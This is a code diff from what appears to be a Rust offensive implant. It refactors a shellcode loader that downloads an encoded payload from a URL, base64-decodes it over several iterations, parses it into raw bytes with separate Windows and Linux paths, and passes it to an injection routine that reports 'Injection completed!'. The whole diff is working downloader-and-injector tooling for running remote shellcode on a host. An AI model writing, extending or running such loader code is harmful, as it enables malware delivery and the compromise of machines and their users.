@@ -24,8 +24,30 @@ use base64::decode as b64_decode;
 #[cfg(windows)] use std::ptr;
 use reqwest::Client;
 
+async fn decode_shellcode(sc: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, &str> {
+    let mut shellcode_vec = Vec::from(sc.trim().as_bytes());
+    for i in 0..b64_iterations {
+        logger.debug(format!("Decode iteration: {i}"));
+        match b64_decode(shellcode_vec) {
+            Ok(d) => {
+                shellcode_vec = d
+                    .into_iter()
+                    .filter(|&b| b != 0x0a)
+                    .collect();
+            },
+            Err(e) => { 
+                let err_msg = e.to_string();
+                logger.err(format!("{}", err_msg.to_owned()));
+                return Err("Could not decode shellcode"); 
+            }
+        };
+    }
+    Ok(shellcode_vec)
+}
+
+
 /// Handles the retrieval and deobfuscation of shellcode from a url.
-// #[cfg(windows)]
+
 async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Result<Vec<u8>, &str> {
     // Download shellcode, or try to
     let client = Client::new();
@@ -33,50 +55,48 @@ async fn get_shellcode(url: String, b64_iterations: u32, logger: &Logger) -> Res
         if r.status().is_success() {   
             logger.info(format!("Got the shellcode")); 
             // Get the shellcode. Now we have to decode it
-            let mut shellcode_encoded: Vec<u8>;
-            let mut shellcode_string: String;
-            let mut shellcode: Vec<u8>;
+            let shellcode_decoded: Vec<u8>;
+            let shellcode: Vec<u8>;
             if let Ok(sc) = r.text().await {
-                shellcode_encoded = Vec::from(sc.trim().as_bytes());
                 logger.info(format!("Got encoded bytes"));
-                for i in 0..b64_iterations {
-                    logger.debug(format!("Decode iteration: {i}"));
-                    match b64_decode(shellcode_encoded) {
-                        Ok(d) => {
-                            shellcode_encoded = d
-                                .into_iter()
-                                .filter(|&b| b != 0x0a)
-                                .collect();
-                        },
-                        Err(e) => { 
-                            let err_msg = e.to_string();
-                            logger.err(format!("{}", err_msg.to_owned()));
-                            return Err("Could not decode shellcode"); 
-                        }
-                    };
-                    
+                
+                match decode_shellcode(sc, b64_iterations, logger).await {
+                    Ok(scd) => { shellcode_decoded = scd; },
+                    Err(e)  => { return Err(e); }
+                }; 
+                
+                
+                #[cfg(windows)] {
+                    // Convert bytes to our proper string
+                    // This only happens on Windows
+                    let shellcode_string: String;
+                    if let Ok(s) = String::from_utf8(shellcode_decoded) {
+                        shellcode_string = s;
+                    } else {
+                        let err_msg = "Could not convert shellcode bytes to string";
+                        logger.err(err_msg.to_string());
+                        return Err("Could not convert shellcode bytes to string");
+                    }                    
+                    // At this point, we have the comma-separated "0xNN" form of the shellcode.
+                    // We need to get each one until a proper u8.
+                    // Now, keep in mind we only do this for Windows, because we pretty much only make raw byes,
+                    // Not '0x' strings for Linux.
+                    shellcode = shellcode_string
+                        .split(",")
+                        .map(|s| s.replace("0x", ""))
+                        .map(|s| s.replace(" ", ""))                    
+                        .map(|s|{ 
+                            match u8::from_str_radix(&s, 16) {
+                                Ok(b) => b,
+                                Err(_) => 0
+                            }
+                        })
+                        .collect();
                 }
-                // Convert bytes to our proper string
-                if let Ok(s) = String::from_utf8(shellcode_encoded) {
-                    shellcode_string = s;
-                } else {
-                    let err_msg = "Could not convert shellcode bytes to string";
-                    logger.err(err_msg.to_string());
-                    return Err("Could not convert shellcode bytes to string");
+
+                #[cfg(not(windows))] {
+                    shellcode = shellcode_decoded;
                 }
-                // At this point, we have the comma-separated "0xNN" form of the shellcode.
-                // We need to get each one until a proper u8.
-                shellcode = shellcode_string
-                    .split(",")
-                    .map(|s| s.replace("0x", ""))
-                    .map(|s| s.replace(" ", ""))                    
-                    .map(|s|{ 
-                        match u8::from_str_radix(&s, 16) {
-                            Ok(b) => b,
-                            Err(_) => 0
-                        }
-                    })
-                    .collect();
                 
                 // The actual success
                 return Ok(shellcode);
@@ -348,7 +368,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, logger: &Logger) -> Result<Strin
                     exec_shellcode();
                 }
                 
-                return Ok("MMMMap".to_string());
+                return Ok("Injection completed!".to_string());
             },
             _ => { return Ok("Unknown injection method!".to_string()) ;}
         }
